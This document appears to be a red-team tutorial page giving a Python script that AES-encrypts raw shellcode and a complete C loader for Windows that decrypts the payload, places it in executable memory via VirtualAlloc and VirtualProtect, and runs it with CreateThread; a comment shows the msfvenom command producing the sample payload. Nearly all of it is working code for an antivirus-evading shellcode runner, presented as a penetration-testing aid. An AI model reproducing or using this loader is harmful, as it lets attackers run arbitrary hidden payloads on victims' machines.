# AES Encrypted Payload

The Python code implements an AES encryption utility to encrypt a file's contents using a randomly generated 16-byte key. It uses AES in CBC mode with an Initialization Vector (IV) of zero bytes. The plaintext file's data is read, padded to fit the AES block size, hashed into a 256-bit key using SHA-256, and then encrypted. The program outputs the AES key and the ciphertext in a comma-separated hex format for use in external applications, such as a C application, for payload execution.

```python
import hashlib
import sys
from os import urandom

from Crypto.Cipher import AES

KEY = urandom(16)

def pad(s):
    pad_len = AES.block_size - len(s) % AES.block_size
    return s + bytes([pad_len] * pad_len)

def aesenc(plaintext_bytes, key):
    k = hashlib.sha256(key).digest()
    iv = bytes(16)
    plaintext_padded = pad(plaintext_bytes)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(plaintext_padded)

if len(sys.argv) != 2:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit(1)

try:
    with open(sys.argv[1], "rb") as f:
        plaintext = f.read()
except Exception as e:
    print(f"Failed to read file: {e}")
    sys.exit(1)

ciphertext = aesenc(plaintext, KEY)

print("AESkey[] = { " + ", ".join("0x{:02x}".format(b) for b in KEY) + " };")
print("payload[] = { " + ", ".join("0x{:02x}".format(b) for b in ciphertext) + " };")

```

The C code demonstrates how to decrypt an AES-encrypted payload and execute it within a Windows environment. It includes the following key components:

* **Payload Definition**: The `payload` array contains the encrypted bytes produced by the Python script. The `payload_len` variable stores the length of this payload for later use.
* **Key Definition**: The `key` array contains the AES key used for decrypting the payload, which matches the key generated in the Python encryption step.
* **Decryption Function (`AESDecrypt`)**: This function leverages Windows Cryptography APIs to decrypt the payload. It acquires a cryptographic context, creates a hash of the key with SHA-256, derives an AES-256 key, and uses it to decrypt the payload.
* **Memory Allocation and Execution**: In `main()`, virtual memory is allocated with `VirtualAlloc`, and decrypted payload data is copied into this memory. It then changes the memory's protection to executable and creates a thread to execute the decrypted payload.

This code is often used in penetration testing contexts to execute shellcode dynamically within a host system.

```c
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>

// msfvenom -p windows/x64/exec CMD="notepad.exe" -f raw -o notepad.bin
// python3 aes.py notepad.bin

unsigned char payload[] = { 0xe4, 0xd2, 0x95, 0xe3, 0x3f, 0xba, 0x99, 0x32, 0xae, 0x0f, 0x29, 0x9e, 0x93, 0xbd, 0x26, 0x2b, 0x5a, 0x30, 0x14, 0x4e, 0xb9, 0x59, 0x1d, 0x74, 0x0e, 0xa5, 0xee, 0xa5, 0xb2, 0xae, 0xb7, 0xda, 0x08, 0xa6, 0x54, 0x65, 0x7e, 0x92, 0x03, 0x9e, 0x69, 0x61, 0x84, 0x54, 0xd0, 0xec, 0x89, 0x4a, 0x78, 0xec, 0x74, 0x8b, 0x59, 0x27, 0x53, 0x59, 0x44, 0x77, 0x07, 0x77, 0x8f, 0x3e, 0x57, 0x02, 0xf1, 0x0f, 0x22, 0x2c, 0x5c, 0xb6, 0xef, 0x9d, 0x8b, 0xf2, 0x47, 0xdb, 0x88, 0x34, 0x7d, 0x02, 0x27, 0x9f, 0x71, 0xbe, 0x71, 0xbb, 0x51, 0xd0, 0xfd, 0x87, 0xc8, 0xf0, 0xa1, 0x1d, 0x04, 0x0e, 0x04, 0x72, 0xf8, 0xc2, 0x46, 0xba, 0x59, 0x45, 0xa2, 0x48, 0x70, 0x72, 0xca, 0xca, 0x1e, 0xda, 0xe6, 0xfd, 0x91, 0x65, 0x23, 0x84, 0x42, 0xc9, 0xb6, 0x63, 0xef, 0x47, 0x4e, 0xeb, 0xec, 0xcb, 0x86, 0x88, 0xd1, 0xa1, 0x8f, 0x9a, 0x66, 0x87, 0xc3, 0x4f, 0x49, 0xbb, 0x0f, 0x74, 0x8a, 0x8b, 0xd7, 0xa0, 0x73, 0x11, 0x17, 0x8b, 0xbd, 0x77, 0xae, 0xed, 0xd3, 0x57, 0x71, 0xd2, 0xde, 0x2e, 0x55, 0x39, 0x6a, 0x4d, 0x49, 0x23, 0x6f, 0xaa, 0xeb, 0xcc, 0x0c, 0xaf, 0x62, 0x5f, 0xf2, 0x9f, 0x54, 0xa8, 0x05, 0xa3, 0xc1, 0xfe, 0x08, 0xc1, 0x66, 0xf5, 0x51, 0xb9, 0xbf, 0xf0, 0x20, 0x5e, 0x79, 0xc4, 0x0e, 0xce, 0x41, 0x1b, 0xcf, 0x4b, 0xba, 0x5b, 0xfc, 0x01, 0x78, 0x42, 0x6e, 0x73, 0x92, 0x82, 0xc7, 0x20, 0xa5, 0x3f, 0xd6, 0x24, 0x2c, 0x3a, 0x65, 0x82, 0xc4, 0xb7, 0x39, 0x02, 0x7d, 0xdd, 0x99, 0x1f, 0xc4, 0xb2, 0xa5, 0x16, 0xf0, 0xd4, 0xbc, 0xd7, 0xc6, 0xdf, 0xd0, 0x1b, 0x2a, 0xa7, 0x2f, 0x48, 0x21, 0x73, 0x6b, 0x28, 0x34, 0x99, 0x27, 0xd2, 0x2d, 0x21, 0x51, 0x33, 0xd4, 0x54, 0x53, 0x7c, 0x63, 0x46, 0x5e, 0xe9, 0x0c, 0x2f, 0x84, 0x6e, 0x73, 0x4c, 0x3c, 0xd3, 0xc4, 0x30, 0xe3, 0x83, 0x99, 0xbd, 0xc1, 0x9d, 0x65, 0x27, 0xa4, 0xf1, 0x2c, 0xa1, 0xb0, 0x6d };
unsigned int payload_len = sizeof(payload);
unsigned char key[] = { 0xbc, 0x27, 0x88, 0x0d, 0x00, 0xa9, 0x53, 0xda, 0x07, 0x0c, 0x7b, 0xd6, 0xa5, 0x72, 0x25, 0x52 };

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;
    DWORD dataLen = payload_len; 

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)payload, &dataLen)) {
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        return -1;
    }
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return 0;
}

int main() {

	void* exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	AESDecrypt((char*)payload, payload_len, (char *) key, sizeof(key));

	RtlMoveMemory(exec_mem, payload, payload_len);

	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0) {
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
```
